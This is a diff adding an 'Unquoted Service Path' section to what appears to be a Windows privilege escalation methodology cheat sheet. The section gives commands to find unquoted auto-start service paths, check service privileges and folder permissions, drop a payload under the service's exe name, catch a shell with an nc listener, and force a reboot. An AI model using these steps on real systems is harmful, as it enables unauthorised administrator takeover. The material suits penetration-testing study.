@@ -161,6 +161,30 @@ Windows Privilege Escalation Methodology
 When you will open you will have evil to administrators groups:
  *  net localgroup Administrators
 
+## Unquoted Service Path
+* Discover all the services that are running on the target host and identify those that are not enclosed inside quotes:
+  * wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+* The next step is to try to identify the level of privilege that this service is running. This can be identified easily:
+  * sc qc "<service name>"
+  
+* Now we need to check the folder in which we can write to. Checking the same using icacls progressively into the folders:
+  * icacls c:\<path>\
+  * icacls c:\<path>\<path>
+  * icacls c:\<path>\<path>\file.exe
+  
+* Create a new exe payload in line and copied with name of old exe.
+* Open a nc listener.
+
+* sc stop "<Service name>"
+  * if access denied then use sc qc "<service name>" and find if service has attribute Auto_start.
+  * whoami /priv 
+    * if SeShutdownPrivilege then:
+      * shutdown /r /t 0 
+
+* after restart you will have nc listener.
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
 ## Insecure Service Permissions
 * Detect is to find a service with weak permissions
   * accesschk.exe -uwcqv *
